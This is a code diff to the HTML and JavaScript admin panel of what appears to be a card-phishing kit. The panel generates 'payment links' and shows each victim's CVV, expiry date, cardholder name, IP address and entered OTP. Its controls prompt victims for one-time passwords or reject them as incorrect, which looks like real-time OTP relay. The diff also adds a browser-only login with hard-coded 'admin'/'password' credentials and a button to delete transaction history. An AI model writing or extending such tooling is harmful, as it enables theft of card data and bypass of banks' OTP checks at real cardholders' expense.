@@ -11,13 +11,21 @@
       font-family: Arial, sans-serif; 
       padding: 20px;
     }
-    h1 { 
-      text-align: center; 
-      margin-bottom: 20px; 
+    #loginForm, #adminContent { max-width: 1200px; margin: 0 auto; }
+    #adminContent { display: none; }
+    h1 { text-align: center; margin-bottom: 20px; }
+    .header-buttons {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 20px;
     }
-    .container {
-      max-width: 1200px;
-      margin: 0 auto;
+    .header-buttons button {
+      background: #4a90e2;
+      border: none;
+      color: #fff;
+      padding: 8px 12px;
+      border-radius: 4px;
+      cursor: pointer;
     }
     .generate-link {
       background: #222;
@@ -25,116 +33,56 @@
       border-radius: 8px;
       margin-bottom: 20px;
     }
-    .form-group {
-      margin-bottom: 15px;
-    }
-    label {
-      display: block;
-      margin-bottom: 5px;
-      color: #aaa;
-    }
-    input, textarea {
-      width: 100%;
-      padding: 8px;
-      border: 1px solid #444;
-      background: #333;
-      color: #fff;
-      border-radius: 4px;
-    }
-    .payment-link {
-      margin-top: 15px;
-      padding: 10px;
-      background: #333;
-      border-radius: 4px;
-      display: none;
-    }
-    .copy-btn {
-      background: #22c55e;
-      border: none;
-      color: white;
-      padding: 5px 10px;
-      border-radius: 4px;
-      cursor: pointer;
-      margin-left: 10px;
-    }
-    table {
-      width: 100%; 
-      border-collapse: collapse;
-      background: #111; 
-      margin-bottom: 20px;
-    }
-    th, td {
-      padding: 10px; 
-      border: 1px solid #333;
-      text-align: left; 
-      font-size: 12px;
-    }
-    th { 
-      background: #222; 
-    }
-    tr:nth-child(even) { 
-      background: #222; 
-    }
-    button {
-      background: #4a90e2; 
-      color: #fff;
-      border: none; 
-      padding: 6px 10px; 
-      margin-right: 4px;
-      cursor: pointer; 
-      border-radius: 4px; 
-      font-size: 12px;
-    }
-    button:hover {
-      background: #357ABD;
-    }
-    button:disabled {
-      background: #666;
-      cursor: not-allowed;
-    }
-    .refresh-btn {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      padding: 10px 20px;
-      background: #22c55e;
-      font-size: 14px;
-    }
-    .status-badge {
-      padding: 2px 6px;
-      border-radius: 3px;
-      font-size: 11px;
-      font-weight: bold;
-    }
+    .form-group { margin-bottom: 15px; }
+    label { display: block; margin-bottom: 5px; color: #aaa; }
+    input, textarea { width: 100%; padding: 8px; border: 1px solid #444; background: #333; color: #fff; border-radius: 4px; }
+    .payment-link { margin-top: 15px; padding: 10px; background: #333; border-radius: 4px; display: none; }
+    .copy-btn { background: #22c55e; border: none; color: white; padding: 5px 10px; border-radius: 4px; cursor: pointer; margin-left: 10px; }
+    table { width: 100%; border-collapse: collapse; background: #111; margin-bottom: 20px; }
+    th, td { padding: 10px; border: 1px solid #333; text-align: left; font-size: 12px; }
+    th { background: #222; }
+    tr:nth-child(even) { background: #222; }
+    button { background: #4a90e2; color: #fff; border: none; padding: 6px 10px; margin-right: 4px; cursor: pointer; border-radius: 4px; font-size: 12px; }
+    button:hover { background: #357ABD; }
+    button:disabled { background: #666; cursor: not-allowed; }
+    .status-badge { padding: 2px 6px; border-radius: 3px; font-size: 11px; font-weight: bold; }
     .status-processing { background: #f59e0b; color: #000; }
     .status-otp { background: #3b82f6; color: #fff; }
     .status-success { background: #22c55e; color: #fff; }
     .status-fail { background: #ef4444; color: #fff; }
-    .otp-received {
-      background-color: #10B981;
-      color: white;
-      padding: 2px 6px;
-      border-radius: 4px;
-      font-size: 12px;
-    }
-    .show-otp-btn {
-      background: #22c55e;
-    }
-    .show-otp-btn:disabled {
-      background: #666;
-    }
-    .wrong-otp-btn {
-      background: #ef4444;
-    }
-    .wrong-otp-btn:hover {
-      background: #dc2626;
-    }
+    .otp-received { background-color: #10B981; color: white; padding: 2px 6px; border-radius: 4px; font-size: 12px; }
+    .refresh-btn { position: fixed; bottom: 20px; right: 20px; padding: 10px 20px; background: #22c55e; font-size: 14px; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Admin Panel</h1>
-    
+  <!-- Login Form -->
+  <div id="loginForm">
+    <h1>Admin Login</h1>
+    <form onsubmit="return doLogin(event);">
+      <div class="form-group">
+        <label>Username</label>
+        <input type="text" id="adminUsername" required>
+      </div>
+      <div class="form-group">
+        <label>Password</label>
+        <input type="password" id="adminPassword" required>
+      </div>
+      <button type="submit">Login</button>
+    </form>
+  </div>
+
+  <!-- Admin Content -->
+  <div id="adminContent">
+    <div class="header-buttons">
+      <div>
+        <button onclick="logout()">Logout</button>
+        <button onclick="deleteHistory()">Delete History</button>
+        <button onclick="showProfile()">User Profile</button>
+      </div>
+      <div>
+        <span>Welcome, <span id="adminUser"></span></span>
+      </div>
+    </div>
     <div class="generate-link">
       <h2>Generate Payment Link</h2>
       <form id="generateLinkForm">
@@ -167,6 +115,7 @@
           <th>CVV</th>
           <th>Expiry</th>
           <th>Cardholder</th>
+          <th>IP Address</th>
           <th>OTP</th>
           <th>Status</th>
           <th>Actions</th>
@@ -179,9 +128,49 @@
   </div>
 
   <script>
-    let transactions = new Map();
-    
-    document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
+    // --- Simple Admin Login (Hard-coded credentials) ---
+    const validUsername = "admin"; // change as needed
+    const validPassword = "password"; // change as needed
+
+    function doLogin(e) {
+      e.preventDefault();
+      const username = document.getElementById('adminUsername').value;
+      const password = document.getElementById('adminPassword').value;
+      if (username === validUsername && password === validPassword) {
+        localStorage.setItem("adminLoggedIn", "true");
+        document.getElementById('adminUser').textContent = username;
+        document.getElementById('loginForm').style.display = 'none';
+        document.getElementById('adminContent').style.display = 'block';
+        loadTransactions();
+        setInterval(loadTransactions, 2000);
+      } else {
+        alert("Incorrect credentials");
+      }
+      return false;
+    }
+
+    function logout() {
+      localStorage.removeItem("adminLoggedIn");
+      location.reload();
+    }
+
+    function deleteHistory() {
+      if (confirm("Are you sure you want to delete all transaction history?")) {
+        // In a real app, you'd call an API to delete from DB.
+        fetch("/api/deleteTransactions", { method: "DELETE" })
+          .then(() => {
+            alert("Transaction history deleted");
+            loadTransactions();
+          })
+          .catch(err => console.error(err));
+      }
+    }
+
+    function showProfile() {
+      alert("User Profile feature not implemented yet.");
+    }
+
+    async function generateLink(e) {
       e.preventDefault();
       const amount = document.getElementById('amount').value;
       const description = document.getElementById('description').value;
@@ -195,12 +184,16 @@
         if (data.status === 'success') {
           document.getElementById('paymentLink').textContent = data.paymentLink;
           document.getElementById('paymentLinkContainer').style.display = 'block';
+        } else {
+          alert('Failed to generate payment link');
         }
       } catch (error) {
         console.error('Error generating payment link:', error);
         alert('Failed to generate payment link');
       }
-    });
+    }
+    
+    document.getElementById('generateLinkForm').addEventListener('submit', generateLink);
 
     function copyPaymentLink() {
       const link = document.getElementById('paymentLink').textContent;
@@ -270,14 +263,15 @@
             <td>${tx.cvv}</td>
             <td>${tx.expiry}</td>
             <td>${tx.cardholder}</td>
+            <td>${tx.ip || 'N/A'}</td>
             <td>
               ${tx.otpEntered ? 
                 `<span class="otp-received">${tx.otpEntered}</span>
                  <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}')" ${tx.redirectStatus ? 'disabled' : ''}>
                    Incorrect OTP
                  </button>` : 
-                tx.otpShown ?
-                  '<span class="status-badge status-otp">Waiting for OTP</span>' :
+                tx.otpShown ? 
+                  '<span class="status-badge status-otp">Waiting for OTP</span>' : 
                   `<button class="show-otp-btn" onclick="showOTP('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
                     Show OTP
                   </button>`
@@ -305,9 +299,6 @@
         console.error('Error loading transactions:', error);
       }
     }
-
-    loadTransactions();
-    setInterval(loadTransactions, 2000);
   </script>
 </body>
 </html>
